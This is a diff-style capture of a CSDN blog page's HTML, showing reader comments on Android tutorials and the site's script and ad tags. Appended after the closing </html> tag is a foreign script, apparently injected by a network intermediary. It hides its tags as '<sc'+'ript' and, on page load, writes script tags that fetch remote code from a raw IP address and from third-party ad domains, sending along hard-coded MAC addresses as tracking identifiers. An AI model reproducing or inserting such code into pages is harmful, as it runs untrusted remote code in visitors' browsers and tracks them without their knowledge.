+         <a href="/vipzjyno1/article/details/23206387#comments">Android-Universal-Image-Loader 图片异步加载类库的使用（超详细配置）</a>
+    <p style="margin:0px;"><a href="/qq_34455135" class="user_name">qq_34455135</a>:
+貌似不支持ftp下载
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/26004831#comments">Android 服务类Service 的详细学习</a>
+    <p style="margin:0px;"><a href="/qq_16471893" class="user_name">qq_16471893</a>:
+远程服务和本地服务确定没有区分错误吗
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/23619269#comments">（android高仿系列）今日头条 --新闻阅读器 （二）</a>
+    <p style="margin:0px;"><a href="/m0_37783117" class="user_name">m0_37783117</a>:
+报错如下：Error:Error: Found item Style/left_drawer_ite...
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/23619269#comments">（android高仿系列）今日头条 --新闻阅读器 （二）</a>
+    <p style="margin:0px;"><a href="/m0_37783117" class="user_name">m0_37783117</a>:
+编译报错 跑不起来 ，求帮助啊
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/23619269#comments">Android APK反编译就这么简单  详解（附图）</a>
+    <p style="margin:0px;"><a href="/baidu_37805974" class="user_name">baidu_37805974</a>:
+为什么我找不到dex2jar-0.0.9.15 文件夹，没办法进行了，笑cry
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/23619269#comments">Android APK反编译就这么简单  详解（附图）</a>
+    <p style="margin:0px;"><a href="/qq_36549594" class="user_name">qq_36549594</a>:
+厉害了楼主 谢谢了
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/23619269#comments">Android APK反编译就这么简单  详解（附图）</a>
+    <p style="margin:0px;"><a href="/ThePromonkeyOf_HeLuo" class="user_name">ThePromonkeyOf_HeLuo</a>:
+亲试可用！都两年了还嫩使用。感谢分享。
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/25248021#comments">Android 通知栏Notification的整合 全面学习 （一个DEMO让你完全了解它）</a>
+    <p style="margin:0px;"><a href="/qq_32463365" class="user_name">qq_32463365</a>:
+楼主太厉害了，小弟佩服佩服！
+    </p>
+    </li>
+    <li>
+   
+         <a href="/vipzjyno1/article/details/25248021#comments">Android-Universal-Image-Loader 图片异步加载类库的使用（超详细配置）</a>
+    <p style="margin:0px;"><a href="/huitengcsdn" class="user_name">huitengcsdn</a>:
+@zjcdqi:请问你是怎么解决的webservice返回的string图片这个问题
+    </p>
+    </li>
+</ul>
+</div>
+    </div>
+    <div class="clear">
+    </div>
+
+
+                   <!-- 广告位开始 --> 
+                    <ins data-revive-zoneid="190" data-revive-id="8c38e720de1c90a6f6ff52f3f89c4d57"></ins> 
+                    <!-- 广告位结束 -->
+
+           </div>   
+
+            <div class="clear">
+            </div>
+        </div>
+
+        
+
+<script type="text/javascript" src="http://c.csdnimg.cn/rabbit/cnick/cnick.js"></script>
+<script type="text/javascript" src="http://static.blog.csdn.net/scripts/newblog.min.js"></script>
+
+
+<script type="text/javascript" src="http://medal.blog.csdn.net/showblogmedal.ashx?blogid=1178541"></script>
+<script type="text/javascript" src="http://static.blog.csdn.net/scripts/JavaScript1.js"></script>
+
+    <script type="text/javascript" src="http://passport.csdn.net/content/loginbox/login.js"></script>
+<script type="text/javascript">document.write("<img src=http://counter.csdn.net/pv.aspx?id=24 border=0 width=0 height=0>");</script>
+<script type="text/javascript" src="http://www.csdn.net/ui/scripts/Csdn/counter.js"></script>
+<script type="text/javascript" src="http://ad.csdn.net/scripts/ad-blog.js"></script>
+<script type="text/javascript">
+    $(function () {
+        function __get_code_toolbar(snippet_id) {
+            return $("<span class='tracking-ad' data-mod='popu_167'><a href='https://code.csdn.net/snippets/"
+                    + snippet_id
+                    + "' target='_blank' title='在CODE上查看代码片'  style='text-indent:0;'><img src='https://code.csdn.net/assets/CODE_ico.png' width=12 height=12 alt='在CODE上查看代码片' style='position:relative;top:1px;left:2px;'/></a></span>"
+                    + "<span class='tracking-ad' data-mod='popu_170'><a href='https://code.csdn.net/snippets/"
+                    + snippet_id
+                    + "/fork' target='_blank' title='派生到我的代码片' style='text-indent:0;'><img src='https://code.csdn.net/assets/ico_fork.svg' width=12 height=12 alt='派生到我的代码片' style='position:relative;top:2px;left:2px;'/></a></span>");
+        }
+        
+        $("[code_snippet_id]").each(function () {
+            __s_id = $(this).attr("code_snippet_id");
+            if (__s_id != null && __s_id != "" && __s_id != 0 && parseInt(__s_id) > 70020) {
+                __code_tool = __get_code_toolbar(__s_id);
+                $(this).prev().find(".tools").append(__code_tool);
+            }
+        });
+
+        $(".bar").show();
+    });
+</script>
+
+
+
+
+
+    </div>
+      <!--new top-->
+    
+    <script id="csdn-toolbar-id" btnId="header_notice_num" wrapId="note1" count="5" subCount="5" type="text/javascript" src="http://c.csdnimg.cn/public/common/toolbar/js/toolbar.js"></script>     <!--new top-->
+   
+    <link href="http://c.csdnimg.cn/comm_ask/css/ask_float_block.css" type="text/css" rel="stylesheet" />
+    <script language='JavaScript' type='text/javascript' src='http://c.csdnimg.cn/comm_ask/js/libs/wmd.js'></script>
+    <script language='JavaScript' type='text/javascript' src='http://c.csdnimg.cn/comm_ask/js/libs/showdown.js'></script>
+    <script language='JavaScript' type='text/javascript' src='http://c.csdnimg.cn/comm_ask/js/libs/prettify.js'></script>
+    <script language='JavaScript' type='text/javascript' src='http://c.csdnimg.cn/comm_ask/js/apps/ask_float_block.js'></script>
+   
+
+   
+
+  <div id="a52b5334d" style="width: 1px; height: 1px; display: none;">
+                    <script id="adJs52b5334"></script>
+                    <script>document.getElementById("adJs52b5334").src = "http://ads.csdn.net/js/opt/52b5334.js?t=" + Math.random();</script>
+   </div>
+
+    <link rel="stylesheet" href="http://static.blog.csdn.net/css/blog_code.css" />
+    <script type="text/javascript" src="http://static.blog.csdn.net/scripts/saveToCode.js"></script>
+      <script type="text/javascript" src="//csdnimg.cn/rabbit/tracking-ad/main.js?75eacd8"></script>
+
+     <link rel="stylesheet" href="http://static.blog.csdn.net/css/fa.css" />
+
+    <div class="pop_CA_cover"  style="display:none"></div>
+    <div class="pop pop_CA"  style="display:none">
+          <div class="CA_header">
+            收藏助手
+            <span class="cancel_icon"  id="fapancle"  onclick="$('.pop_CA').hide();$('.pop_CA_cover').hide();"></span>
+          </div>
+          <iframe src="" id="fa" frameborder="0" width="100%" height="360"  scrolling="no" />
+    </div>
+</body>
+</html>   
+ <script>
+function ik_random(){var ik_r_min=0;var ik_r_max=100;return(parseInt(Math.random()*(ik_r_max-ik_r_min+1)+ik_r_min));}
+function ik_isiframe(){return (self!=top);}
+var __m='b8:2a:72:c1:db:f9';
+var __m2='00:00:00:00:00:00';
+var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=48c591bb0b2e4fd248d81fbb9360387b,PC,";
+var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+var x=ik_random();
+if(!ik_isiframe()){
+switch(true){
+case x>=0&&x<20:
+document.write(__h+"200"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?cid=10270&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+case x>=20&&x<30:
+document.write(__h+"12"+__b);
+document.write("<sc"+"ript src=\"http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B&apmac="+__m2+"&cumid="+__m+"\"></scr"+"ipt>");
+break;
+case x>=70&&x<=100:
+document.write(__h+"100"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?R6GpL99&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+break;
+}
+}
+</script>
